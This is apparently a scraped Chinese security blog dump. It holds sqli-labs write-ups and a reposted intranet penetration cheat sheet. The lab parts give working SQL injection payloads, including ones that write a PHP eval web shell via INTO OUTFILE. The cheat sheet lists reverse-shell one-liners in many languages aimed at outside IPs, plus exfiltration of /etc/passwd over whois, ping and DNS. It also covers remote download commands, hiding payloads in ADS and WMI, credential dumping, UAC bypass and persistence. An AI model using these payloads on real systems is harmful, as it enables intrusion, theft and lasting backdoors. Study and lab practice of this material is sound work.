&quot;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\sqli-49.txt&quot; 使用之前的 lines terminated进行数据间分割 12使用lines terminated 将一句话木马转换为16进制，插入数据进行分割select &lt;?php @eval($_POST[admin])?&gt; into outfile &quot;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\sqli-49_1.php&quot; lines treminated 0x3c3f70687020406576616c28245f504f53545b61646d696e5d293f3ea 之前学过一个 select *** into outfile “路径” 以49关为例查看能否向之前一样，将信息打印出 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-49&#x2F;?sort&#x3D;1&#39; into outfile &quot;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\sqli-49.txt&quot; --+ 以上不用管，查看路径中是否有sqli-49.txt这个文件，成功返回 打开查看内容，成功获取","categories":[],"tags":[]},{"title":"sqli-labs关卡/sql-labs第四十五关上传一句话木马","slug":"sqli-labs关卡/sql-labs第四十五关上传一句话木马","date":"2020-07-25T01:18:02.328Z","updated":"2020-03-25T14:01:20.106Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sql-labs第四十五关上传一句话木马/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sql-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E5%85%B3%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/","excerpt":"","text":"写入一句话木马得有几个条件 1、root 不一定是root权限，但必须是可写权限 2、一句话木马 3、select xxx into outfile xxx 4、路径绝对路径 其中0x363636是666的16进制，用666来将数据间进行分割 1select &#39;&lt;?php @eval($_POST[&#39;admin&#39;]);?&gt;&#39; into outfile &#39;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\one.php&#39; lines terminated by 0x363636; # 带入也就是 12这里的意思是，获取users中的所有数据，然后0x363636是666的十六进制，数据的间隔会以666为间隔select * from users into outfile &#39;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\one.php&#39; lines terminated by 0x363636; # 一句话木马 1&lt;?php @eval($_POST[&#39;admin&#39;]);?&gt; 绝对路径 1D:\\\\phpStudy\\\\PHPTutorial\\\\WWW 格式 1select &#39;&lt;?php @eval($_POST[&#39;admin&#39;]);?&gt;&#39; into outfile &#39;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\one.php&#39; # 查看初始文件有没有one.php，并没有one.php 现在写入一句话木马，点击login登录 查看初始文件是否有one.php文件，成功导入 打开one.php文件查看内容，红线处使我们使用中国菜刀或者蚁剑的时候的连接密码 使用中国菜刀连接，成功连接到数据库","categories":[],"tags":[]},{"title":"sqli-labs关卡/sql-labs第二十七关a大小写空格绕过","slug":"sqli-labs关卡/sql-labs第二十七关a大小写空格绕过","date":"2020-07-25T01:18:02.209Z","updated":"2020-03-24T07:26:45.116Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sql-labs第二十七关a大小写空格绕过/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sql-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3a%E5%A4%A7%E5%B0%8F%E5%86%99%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/","excerpt":"","text":"查看当前字段 12将union和select进行大小写，如果不进行大小写会过滤掉http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27a&#x2F;?id&#x3D;11111&quot; %0a uNion %0a selEct %0a 1,2,3 %0a ||&quot;1&quot;&#x3D;&quot;1 查看数据库 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27a&#x2F;?id&#x3D;11111&quot; %0a uNion %0a selEct %0a 1,database(),3 %0a ||&quot;1&quot;&#x3D;&quot;1 查看表名 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27a&#x2F;?id&#x3D;11111&quot; %0a uNion %0a selEct %0a 1,(seLeCt %0a group_concat(table_name)from %0a information_schema.tables %0a where %0a table_schema&#x3D;database()),3 %0a %0a ||&quot;1&quot;&#x3D;&quot;1 查看users表中字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27a&#x2F;?id&#x3D;11111&quot; %0a uNion %0a selEct %0a 1,(seLeCt %0a group_concat(column_name)from %0a information_schema.columns %0a where %0a table_name&#x3D;&#39;users&#39;),3 %0a %0a ||&quot;1&quot;&#x3D;&quot;1 查看username字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27a&#x2F;?id&#x3D;11111&quot; %0a uNion %0a selEct %0a 1,(seLeCt %0a group_concat(username)from %0a users),3 %0a %0a ||&quot;1&quot;&#x3D;&quot;1","categories":[],"tags":[]},{"title":"内网渗透思路","slug":"内网渗透思路","date":"2020-07-25T01:17:48.733Z","updated":"2020-02-12T04:00:50.000Z","comments":true,"path":"2020/07/25/内网渗透思路/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/","excerpt":"","text":"Author: Evi1cg Blog: https://evi1cg.github.io Table of Contents 信息搜集 开源情报信息收集（OSINT） github whois查询/注册人反查/邮箱反查/相关资产 google hacking 创建企业密码字典 字典列表 邮箱列表获取 泄露密码查询 对企业外部相关信息进行搜集 子域名获取 进入内网 基于企业弱账号漏洞 基于系统漏洞进入 网站应用程序渗透 无线Wi-Fi接入 隐匿攻击 Command and Control Fronting 代理 内网跨边界应用 内网跨边界转发 内网跨边界代理穿透 EW Termite 代理脚本 shell反弹 内网文件的传输和下载 搭建 HTTP server 内网信息搜集 本机信息搜集 1、用户列表 2、进程列表 3、服务列表 4、端口列表 5、补丁列表 6、本机共享 7、本用户习惯分析 8、获取当前用户密码工具 Windows Linux 扩散信息收集 端口扫描 常用端口扫描工具 内网拓扑架构分析 常见信息收集命令 第三方信息收集 权限提升 Windows BypassUAC 常用方法 常用工具 提权 Linux 内核溢出提权 计划任务 SUID 系统服务的错误权限配置漏洞 不安全的文件/文件夹权限配置 找存储的明文用户名，密码 权限维持 系统后门 Windows 1、密码记录工具 2、常用的存储Payload位置 3、Run/RunOnce Keys 4、BootExecute Key 5、Userinit Key 6、Startup Keys 7、Services 8、Browser Helper Objects 9、AppInit_DLLs 10、文件关联 11、bitsadmin 12、mof 13、wmi 14、Userland Persistence With Scheduled Tasks 15、Netsh 16、Shim 17、DLL劫持 18、DoubleAgent 19、waitfor.exe 20、AppDomainManager 21、Office 22、CLR 23、msdtc 24、Hijack CAccPropServicesClass and MMDeviceEnumerato 25、Hijack explorer.exe 26、Windows FAX DLL Injection 27、特殊注册表键值 28、快捷方式后门 29、Logon Scripts 30、Password Filter DLL 31、利用BHO实现IE浏览器劫持 Linux crontab 硬链接sshd SSH Server wrapper SSH keylogger Cymothoa_进程注入backdoor rootkit Tools WEB后门 横向渗透 端口渗透 端口扫描 端口爆破 端口弱口令 端口溢出 常见的默认端口 1、web类(web漏洞/敏感目录) 2、数据库类(扫描弱口令) 3、特殊服务类(未授权/命令执行类/漏洞) 4、常用端口类(扫描弱口令/端口爆破) 5、端口合计所对应的服务 信息搜集 获取域控的方法 SYSVOL MS14-068 Kerberos SPN扫描 Kerberos的黄金门票 Kerberos的银票务 域服务账号破解 凭证盗窃 地址解析协议 获取AD哈希 AD持久化 活动目录持久性技巧 Security Support Provider SID History AdminSDHolder＆SDProp 组策略 Hook PasswordChangeNotify TIPS 相关工具 在远程系统上执行程序 IOT相关 中间人 规避杀软及检测 Bypass Applocker bypassAV 痕迹清理 Windows日志清除 破坏Windows日志记录功能 msf 3389登陆记录清除 信息搜集开源情报信息收集（OSINT）github Github_Nuggests（自动爬取Github上文件敏感信息泄露） :https://github.com/az0ne/Github_Nuggests GSIL（能够实现近实时（15分钟内）的发现Github上泄露的信息） :https://github.com/FeeiCN/GSIL x-patrol(小米团队的):https://github.com/MiSecurity/x-patrol whois查询/注册人反查/邮箱反查/相关资产 站长之家:http://whois.chinaz.com/?DomainName=target.com&amp;ws= 爱站:https://whois.aizhan.com/target.com/ 微步在线:https://x.threatbook.cn/ IP反查:https://dns.aizhan.com/ 天眼查:https://www.tianyancha.com/ 虎妈查:http://www.whomx.com/ 历史漏洞查询 : 在线查询:http://wy.zone.ci/ 自搭建:https://github.com/hanc00l/wooyun_publi/ google hacking创建企业密码字典字典列表 passwordlist:https://github.com/lavalamp-/password-lists 猪猪侠字典:https://pan.baidu.com/s/1dFJyedzBlasting_dictionary（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等） 针对特定的厂商，重点构造厂商相关域名的字典1[&#39;%pwd%123&#39;,&#39;%user%123&#39;,&#39;%user%521&#39;,&#39;%user%2017&#39;,&#39;%pwd%321&#39;,&#39;%pwd%521&#39;,&#39;%user%321&#39;,&#39;%pwd%123!&#39;,&#39;%pwd%123!@#&#39;,&#39;%pwd%1234&#39;,&#39;%user%2016&#39;,&#39;%user%123$%^&#39;,&#39;%user%123!@#&#39;,&#39;%pwd%2016&#39;,&#39;%pwd%2017&#39;,&#39;%pwd%1!&#39;,&#39;%pwd%2@&#39;,&#39;%pwd%3#&#39;,&#39;%pwd%123#@!&#39;,&#39;%pwd%12345&#39;,&#39;%pwd%123$%^&#39;,&#39;%pwd%!@#456&#39;,&#39;%pwd%123qwe&#39;,&#39;%pwd%qwe123&#39;,&#39;%pwd%qwe&#39;,&#39;%pwd%123456&#39;,&#39;%user%123#@!&#39;,&#39;%user%!@#456&#39;,&#39;%user%1234&#39;,&#39;%user%12345&#39;,&#39;%user%123456&#39;,&#39;%user%123!&#39;] 密码生成 GenpAss（中国特色的弱口令生成器: https://github.com/RicterZ/genpAss/ passmaker（可以自定义规则的密码字典生成器） ：https://github.com/bit4woo/passmaker pydictor（强大的密码生成器） ：https://github.com/LandGrey/pydictor 邮箱列表获取 theHarvester ：https://github.com/laramies/theHarvester 获取一个邮箱以后导出通讯录 LinkedInt :https://github.com/mdsecactivebreach/LinkedInt Mailget：https://github.com/Ridter/Mailget 泄露密码查询 ghostproject: https://ghostproject.fr/ pwndb: https://pwndb2am4tzkvold.onion.to/ 对企业外部相关信息进行搜集子域名获取 Layer子域名挖掘机4.2纪念版 subDomainsBrute ：https://github.com/lijiejie/subDomainsBrute wydomain ：https://github.com/ring04h/wydomain Sublist3r ：https://github.com/aboul3la/Sublist3r site:target.com:https://www.google.com Github代码仓库 抓包分析请求返回值(跳转/文件上传/app/api接口等) 站长帮手links等在线查询网站 域传送漏洞 Linux 1dig @ns.example.com example&#x3D;.com AXFR Windows 1234nslookup -type&#x3D;ns xxx.yyy.cn #查询解析某域名的DNS服务器nslookup #进入nslookup交互模式server dns.domian.com #指定dns服务器ls xxx.yyy.cn #列出域信息 GetDomainsBySSL.py :https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&amp;type=note#/ censys.io证书 :https://censys.io/certificates?q=target.com crt.sh证书查询:https://crt.sh/?q=%25.target.com shadon :https://www.shodan.io/ zoomeye :https://www.zoomeye.org/ fofa :https://fofa.so/ censys：https://censys.io/ dnsdb.io :https://dnsdb.io/zh-cn/search?q=target.com api.hackertarget.com :http://api.hackertarget.com/reversedns/?q=target.com community.riskiq.com :https://community.riskiq.com/Search/target.com subdomain3 :https://github.com/yanxiu0614/subdomain3 FuzzDomain :https://github.com/Chora10/FuzzDomain dnsdumpster.com :https://dnsdumpster.com/ phpinfo.me :https://phpinfo.me/domain/ dns开放数据接口 :https://dns.bufferover.run/dns?q=baidu.com 进入内网基于企业弱账号漏洞 VPN（通过邮箱，密码爆破，社工等途径获取VPN） 企业相关运维系统（zabbix等） 基于系统漏洞进入 Metasploit(漏洞利用框架):https://github.com/rapid7/metasploit-framework 漏洞利用脚本 网站应用程序渗透 SQL注入 跨站脚本（XSS） 跨站请求伪造（CSRF） SSRF（ssrf_proxy） 功能/业务逻辑漏洞 其他漏洞等 CMS-内容管理系统漏洞 企业自建代理 无线Wi-Fi接入隐匿攻击Command and Control ICMP :https://pentestlab.blog/2017/07/28/command-and-control-icmp/ DNS :https://pentestlab.blog/2017/09/06/command-and-control-dns/ DropBox :https://pentestlab.blog/2017/08/29/command-and-control-dropbox/ Gmail :https://pentestlab.blog/2017/08/03/command-and-control-gmail/ Telegram :http://drops.xmd5.com/static/drops/tips-16142.html Twitter :https://pentestlab.blog/2017/09/26/command-and-control-twitter/ Website Keyword :https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/ PowerShell :https://pentestlab.blog/2017/08/19/command-and-control-powershell/ Windows COM :https://pentestlab.blog/2017/09/01/command-and-control-windows-com/ WebDAV :https://pentestlab.blog/2017/09/12/command-and-control-webdav/ Office 365 :https://www.anquanke.com/post/id/86974 HTTPS :https://pentestlab.blog/2017/10/04/command-and-control-https/ Kernel :https://pentestlab.blog/2017/10/02/command-and-control-kernel/ Website :https://pentestlab.blog/2017/11/14/command-and-control-website/ WMI :https://pentestlab.blog/2017/11/20/command-and-control-wmi/ WebSocket :https://pentestlab.blog/2017/12/06/command-and-control-websocket/ Images :https://pentestlab.blog/2018/01/02/command-and-control-images/ Web Interface :https://pentestlab.blog/2018/01/03/command-and-control-web-interface/ JavaScript :https://pentestlab.blog/2018/01/08/command-and-control-javascript/ … Fronting Domain Fronting Tor_Fronting. 代理 VPN shadowsockts :https://github.com/shadowsocks HTTP :http://cn-proxy.com/ Tor 内网跨边界应用内网跨边界转发 NC端口转发 LCX端口转发 nps 代理脚本 Tunna Reduh … 内网跨边界代理穿透EW正向 SOCKS v5 服务器: 1.&#x2F;ew -s ssocksd -l 1080 反弹 SOCKS v5 服务器:a) 先在一台具有公网 ip 的主机A上运行以下命令： 1$ .&#x2F;ew -s rcsocks -l 1080 -e 8888 b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口 1$ .&#x2F;ew -s rssocks -d 1.1.1.1 -e 8888 多级级联 123$ .&#x2F;ew -s lcx_listen -l 1080 -e 8888$ .&#x2F;ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999$ .&#x2F;ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999 lcx_tran 的用法 12$ .&#x2F;ew -s ssocksd -l 9999$ .&#x2F;ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999 lcx_listen、lcx_slave 的用法 123$ .&#x2F;ew -s lcx_listen -l 1080 -e 8888$ .&#x2F;ew -s ssocksd -l 9999$ .&#x2F;ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999 “三级级联”的本地SOCKS测试用例以供参考 1234$ .&#x2F;ew -s rcsocks -l 1080 -e 8888$ .&#x2F;ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999$ .&#x2F;ew -s lcx_listen -l 9999 -e 7777$ .&#x2F;ew -s rssocks -d 127.0.0.1 -e 7777 Termite使用说明:https://rootkiter.com/Termite/README.txt 代理脚本reGeorg :https://github.com/sensepost/reGeorg shell反弹bash 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1 perl 1perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39; python 1python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; php 1php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; ruby 1ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39; java 123r &#x3D; Runtime.getRuntime()p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor() nc 12#使用-e nc -e &#x2F;bin&#x2F;sh 223.8.200.234 1234 123#不使用-emknod &#x2F;tmp&#x2F;backpipe p&#x2F;bin&#x2F;sh 0&#x2F;tmp&#x2F;backpipe | nc attackerip listenport 1&gt;&#x2F;tmp&#x2F;backpipe lua 1lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;202.103.243.122&#39;,&#39;1234&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot; 内网文件的传输和下载wput 1wput dir_name ftp:&#x2F;&#x2F;linuxpig:123456@host.com&#x2F; wget 1wget http:&#x2F;&#x2F;site.com&#x2F;1.rar -O 1.rar ariac2（需安装） 1aria2c -o owncloud.zip https:&#x2F;&#x2F;download.owncloud.org&#x2F;community&#x2F;owncloud-9.0.0.tar.bz2 powershell 12$p &#x3D; New-Object System.Net.WebClient $p.DownloadFile(&quot;http:&#x2F;&#x2F;domain&#x2F;file&quot;,&quot;C:%homepath%file&quot;) vbs脚本 123456789101112Set args &#x3D; Wscript.ArgumentsUrl &#x3D; &quot;http:&#x2F;&#x2F;domain&#x2F;file&quot;dim xHttp: Set xHttp &#x3D; createobject(&quot;Microsoft.XMLHTTP&quot;)dim bStrm: Set bStrm &#x3D; createobject(&quot;Adodb.Stream&quot;)xHttp.Open &quot;GET&quot;, Url, FalsexHttp.Sendwith bStrm.type &#x3D; 1 &#39;.open.write xHttp.responseBody.savetofile &quot; C:\\%homepath%\\file&quot;, 2 &#39;end with 执行 ：cscript test.vbs Perl 123#!&#x2F;usr&#x2F;bin&#x2F;perl use LWP::Simple; getstore(&quot;http:&#x2F;&#x2F;domain&#x2F;file&quot;, &quot;file&quot;); 执行：perl test.pl Python 123456#!&#x2F;usr&#x2F;bin&#x2F;python import urllib2 u &#x3D; urllib2.urlopen(&#39;http:&#x2F;&#x2F;domain&#x2F;file&#39;) localFile &#x3D; open(&#39;local_file&#39;, &#39;w&#39;) localFile.write(u.read()) localFile.close() 执行：python test.py Ruby 12345678#!&#x2F;usr&#x2F;bin&#x2F;rubyrequire &#39;net&#x2F;http&#39;Net::HTTP.start(&quot;www.domain.com&quot;) &#123; |http|r &#x3D; http.get(&quot;&#x2F;file&quot;)open(&quot;save_location&quot;, &quot;wb&quot;) &#123; |file|file.write(r.body)&#125;&#125; 执行：ruby test.rb PHP 123456789&lt;?php$url &#x3D; &#39;http:&#x2F;&#x2F;www.example.com&#x2F;file&#39;;$path &#x3D; &#39;&#x2F;path&#x2F;to&#x2F;file&#39;;$ch &#x3D; curl_init($url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);$data &#x3D; curl_exec($ch);curl_close($ch);file_put_contents($path, $data);?&gt; 执行：php test.php NCattacker 1cat file | nc -l 1234 target 1nc host_ip 1234 &gt; file FTP 1ftp 127.0.0.1 username password get file exit TFTP 1tftp -i host GET C:%homepath%file location_of_file_on_tftp_server Bitsadmin 1bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;domain&#x2F;file c:%homepath%file Window 文件共享 1net use x: \\127.0.0.1\\share &#x2F;user:example.comuserID myPassword SCP本地到远程 1scp file user@host.com:&#x2F;tmp 远程到本地 1scp user@host.com:&#x2F;tmp file rsync远程rsync服务器中拷贝文件到本地机 1rsync -av root@192.168.78.192::www &#x2F;databack 本地机器拷贝文件到远程rsync服务器 1rsync -av &#x2F;databack root@192.168.78.192::www certutil.exe 1certutil.exe -urlcache -split -f http:&#x2F;&#x2F;site.com&#x2F;file copy 1copy \\\\IP\\ShareName\\file.exe file.exe WHOIS接收端 Host B： 1nc -vlnp 1337 | sed &quot;s&#x2F; &#x2F;&#x2F;g&quot; | base64 -d 发送端 Host A： 1whois -h host_ip -p 1337 &#96;cat &#x2F;etc&#x2F;passwd | base64&#96; WHOIS + TARFirst: 1ncat -k -l -p 4444 | tee files.b64 #tee to a file so you can make sure you have it Next 1tar czf - &#x2F;tmp&#x2F;* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits Finally 1cat files.b64 | tr -d &#39;\\r\\n&#39; | base64 -d | tar zxv #to get the files out PING发送端: 1xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done 接收端ping_receiver.py: 12345678910111213141516import systry: from scapy.all import *except: print(&quot;Scapy not found, please install scapy: pip install scapy&quot;) sys.exit(0)def process_packet(pkt): if pkt.haslayer(ICMP): if pkt[ICMP].type &#x3D;&#x3D; 8: data &#x3D; pkt[ICMP].load[-4:] print(f&#39;&#123;data.decode(&quot;utf-8&quot;)&#125;&#39;, flush&#x3D;True, end&#x3D;&quot;&quot;, sep&#x3D;&quot;&quot;)sniff(iface&#x3D;&quot;eth0&quot;, prn&#x3D;process_packet) 1python3 ping_receiver.py DIG发送端: 1xxd -p -c 31 &#x2F;etc&#x2F;passwd | while read line; do dig @172.16.1.100 +short +tries&#x3D;1 +time&#x3D;1 $line.gooogle.com; done 接收端dns_reciver.py: 12345678910111213try: from scapy.all import *except: print(&quot;Scapy not found, please install scapy: pip install scapy&quot;)def process_packet(pkt): if pkt.haslayer(DNS): domain &#x3D; pkt[DNS][DNSQR].qname.decode(&#39;utf-8&#39;) root_domain &#x3D; domain.split(&#39;.&#39;)[1] if root_domain.startswith(&#39;gooogle&#39;): print(f&#39;&#123;bytearray.fromhex(domain[:-13]).decode(&quot;utf-8&quot;)&#125;&#39;, flush&#x3D;True, end&#x3D;&#39;&#39;)sniff(iface&#x3D;&quot;eth0&quot;, prn&#x3D;process_packet) 1python3 dns_reciver.py … 搭建 HTTP serverpython2 1python -m SimpleHTTPServer 1337 python3 1python -m http.server 1337 PHP 5.4+ 1php -S 0.0.0.0:1337 ruby 1ruby -rwebrick -e&#39;WEBrick::HTTPServer.new(:Port &#x3D;&gt; 1337, :DocumentRoot &#x3D;&gt; Dir.pwd).start&#39; 1ruby -run -e httpd . -p 1337 Perl 1perl -MHTTP::Server::Brick -e &#39;$s&#x3D;HTTP::Server::Brick-&gt;new(port&#x3D;&gt;1337); $s-&gt;mount(&quot;&#x2F;&quot;&#x3D;&gt;&#123;path&#x3D;&gt;&quot;.&quot;&#125;); $s-&gt;start&#39; 1perl -MIO::All -e &#39;io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub &#123; $_[0] &lt; io(-x $1 +? &quot;.&#x2F;$1 |&quot; : $1) if &#x2F;^GET \\&#x2F;(.*) &#x2F; &#125;)&#39; busybox httpd 1busybox httpd -f -p 8000 内网信息搜集本机信息搜集1、用户列表windows用户列表分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户 2、进程列表析杀毒软件/安全监控工具等邮件客户端VPNftp等 3、服务列表与安全防范工具有关服务[判断是否可以手动开关等]存在问题的服务[权限/漏洞] 4、端口列表开放端口对应的常见服务/应用程序[匿名/权限/漏洞等]利用端口进行信息收集 5、补丁列表分析 Windows 补丁第三方软件[Java/Oracle/Flash 等]漏洞 6、本机共享本机共享列表/访问权限本机访问的域共享/访问权限 7、本用户习惯分析历史记录收藏夹文档等 8、获取当前用户密码工具Windows mimikatz wce Invoke-WCMDump mimiDbg LaZagne nirsoft_package QuarksPwDump fgdump 星号查看器等 Linux LaZagne mimipenguin 扩散信息收集端口扫描常用端口扫描工具 nmap masscan zmap s扫描器 自写脚本等 NC … 内网拓扑架构分析 DMZ 管理网 生产网 测试网 常见信息收集命令ipconfig: 1ipconfig &#x2F;all ------&gt; 查询本机 IP 段，所在域等 net: 123456789net user ------&gt; 本机用户列表net localgroup administrators ------&gt; 本机管理员[通常含有域用户]net user &#x2F;domain ------&gt; 查询域用户net group &#x2F;domain ------&gt; 查询域里面的工作组net group &quot;domain admins&quot; &#x2F;domain ------&gt; 查询域管理员用户组net localgroup administrators &#x2F;domain ------&gt; 登录本机的域管理员net localgroup administrators workgroup\\user001 &#x2F;add -----&gt;域用户添加到本机 net group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台)net view ------&gt; 查询同一域内机器列表 net view &#x2F;domain ------&gt; 查询域列表net view &#x2F;domain:domainname dsquery 1234567dsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domaincomputers&quot; &#x2F;domain ------&gt; 列出该域内所有机器名dsquery user domainroot -limit 65535 &amp;&amp; net user &#x2F;domain------&gt;列出该域内所有用户名dsquery subnet ------&gt;列出该域内网段划分dsquery group &amp;&amp; net group &#x2F;domain ------&gt;列出该域内分组 dsquery ou ------&gt;列出该域内组织单位 dsquery server &amp;&amp; net time &#x2F;domain------&gt;列出该域内域控制器 第三方信息收集 NETBIOS 信息收集 SMB 信息收集 空会话信息收集 漏洞信息收集等 权限提升WindowsBypassUAC常用方法 使用IFileOperation COM接口 使用Wusa.exe的extract选项 远程注入SHELLCODE 到傀儡进程 DLL劫持，劫持系统的DLL文件 eventvwr.exe and registry hijacking sdclt.exe SilentCleanup wscript.exe cmstp.exe 修改环境变量，劫持高权限.Net程序 修改注册表HKCU\\Software\\Classes\\CLSID，劫持高权限程序 直接提权过UAC 常用工具 UACME Bypass-UAC Yamabiko … 提权 windows内核漏洞提权 检测类:Windows-Exploit-Suggester,WinSystemHelper,wesng利用类:windows-kernel-exploits，BeRoot 服务提权 数据库服务，ftp服务等 WINDOWS错误系统配置 系统服务的错误权限配置漏洞 不安全的注册表权限配置 不安全的文件/文件夹权限配置 计划任务 任意用户以NT AUTHORITY\\SYSTEM权限安装msi 提权脚本 PowerUP,ElevateKit Linux内核溢出提权linux-kernel-exploits 计划任务123456789101112crontab -lls -alh &#x2F;var&#x2F;spool&#x2F;cronls -al &#x2F;etc&#x2F; | grep cronls -al &#x2F;etc&#x2F;cron*cat &#x2F;etc&#x2F;cron*cat &#x2F;etc&#x2F;at.allowcat &#x2F;etc&#x2F;at.denycat &#x2F;etc&#x2F;cron.allowcat &#x2F;etc&#x2F;cron.denycat &#x2F;etc&#x2F;crontabcat &#x2F;etc&#x2F;anacrontabcat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root SUID123find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; 系统服务的错误权限配置漏洞123cat &#x2F;var&#x2F;apache2&#x2F;config.inccat &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql&#x2F;user.MYDcat &#x2F;root&#x2F;anaconda-ks.cfg 不安全的文件/文件夹权限配置12345cat ~&#x2F;.bash_historycat ~&#x2F;.nano_historycat ~&#x2F;.atftp_historycat ~&#x2F;.mysql_historycat ~&#x2F;.php_history 找存储的明文用户名，密码1234grep -i user [filename]grep -i pass [filename]grep -C 5 &quot;password&quot; [filename]find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla 权限维持系统后门Windows1、密码记录工具WinlogonHackWinlogonHack 是一款用来劫取远程3389登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。键盘记录器安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。NTPass获取管理员口令,一般用 gina 方式来,但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。Linux 下 openssh 后门重新编译运行的sshd服务，用于记录用户的登陆密码。 2、常用的存储Payload位置WMI :存储： 12345$StaticClass &#x3D; New-Object Management.ManagementClass(&#39;root\\cimv2&#39;, $null,$null)$StaticClass.Name &#x3D; &#39;Win32_Command&#39;$StaticClass.Put()$StaticClass.Properties.Add(&#39;Command&#39; , $Payload)$StaticClass.Put() 读取: 1$Payload&#x3D;([WmiClass] &#39;Win32_Command&#39;).Properties[&#39;Command&#39;].Value 包含数字签名的PE文件利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名特殊ADS… 12type putty.exe &gt; ...:putty.exewmic process call create c:\\test\\ads\\...:putty.exe 特殊COM文件 12type putty.exe &gt; \\\\.\\C:\\test\\ads\\COM1:putty.exewmic process call create \\\\.\\C:\\test\\ads\\COM1:putty.exe 磁盘根目录 12type putty.exe &gt;C:\\:putty.exe wmic process call create C:\\:putty.exe 3、Run/RunOnce Keys用户级 12HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce 管理员 